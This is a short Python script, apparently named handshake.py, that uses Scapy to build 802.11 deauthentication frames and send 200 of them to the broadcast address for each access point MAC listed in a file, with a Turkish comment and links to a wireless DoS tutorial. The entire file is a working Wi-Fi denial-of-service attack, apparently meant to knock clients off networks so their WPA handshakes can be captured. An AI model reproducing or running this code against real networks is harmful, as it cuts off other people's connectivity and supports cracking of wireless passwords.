from scapy.all import *
import time
# handshake.py


# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
def deauth(bssid, client):
    print bssid
    # https://canyoupwn.me/tr-scapy-ile-wireless-dos-araci-gelistirmek/
    # https://stackoverflow.com/questions/39635324/scapy-verbose-mode-documentation
    conf.iface = 'wlan2mon'
    # verbose  : Program çalışırken çıktı verip vermemesi ile ilgili. Eğer “False” olursa herhangi bir çıktı üretmeyecektir.
    conf.verb = 0
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    for i in range(0, 200):
        sendp(packet)


# read APs MAC addresses
with open('APS.txt', 'r') as f:
    data = f.readlines()

for i in data:
    deauth(i, "FF:FF:FF:FF:FF:FF")
    time.sleep(5)
